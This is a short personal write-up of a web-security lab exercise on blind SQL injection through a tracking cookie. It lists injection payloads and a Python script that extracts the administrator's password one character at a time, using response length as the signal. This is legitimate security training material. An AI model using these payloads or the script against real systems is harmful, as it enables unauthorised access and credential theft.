# Lab: Blind SQL injection with conditional responses

test : if we can use sql injection
```
payload : xyz' or 'a'='a
```
Test if we have table users
```
payload: xyz' or substring((select 'a' from user),1,1) = 'a
```
test if we have column password :
```
xyz' OR SUBSTRING((SELECT CONCAT(substring(u.password,1,1),'a') FROM Users as u where u.username='administrator' LIMIT 1), 2, 1) = 'a
```
find the length of the password. 20 characters ! 
```
aa' or  length((select password from users where username='administrator' limit 1)) = '20  # 20 characters ! 
```
test if the letter greater than 't' : 
```
xyz' OR SUBSTRING((SELECT password FROM Users as u where u.username='administrator' LIMIT 1), 1, 1) > 't
```
test if the letter = 'x' : 
```
xyz' OR SUBSTRING((SELECT password FROM Users as u where u.username='administrator' LIMIT 1), 1, 1) = 'x
```
So I decided to write a small python script to detect the password: 
```python
import requests
from requests.structures import CaseInsensitiveDict
import string
import time

# cookie = azeaze
url = '' # your URL here
array_string = list(string.ascii_lowercase)
array_number = list(string.digits)
array_string.extend(array_number)
password = []

# password have 20 characters , start with 0

for x in range(20):
    # for each value in the array_string
    print(f"hello {x}")
    for i in range(len(array_string)):
        headers = CaseInsensitiveDict()
        TrackingId = f"xyz' OR SUBSTRING((SELECT password FROM Users as u where u.username='administrator' LIMIT 1), {x+1}, 1) = '{array_string[i]}"
        headers["Cookie"] = f"TrackingId={TrackingId}; session=vhEqspOijiN2CuVWZIvJVN0hdWAF46AG" # this work with this header !!
        print(headers)
        resp = requests.get(url,headers=headers)
        if resp.headers['Content-Length'] == '1694':
            print("add this letter : %s" %{array_string[i]})
            password.append(array_string[i])
            
            break
        time.sleep(0.5) # wait 0.5 sec after next request
    time.sleep(1) # wait 1 sec for next loop of the chaine

print("".join(password))
```
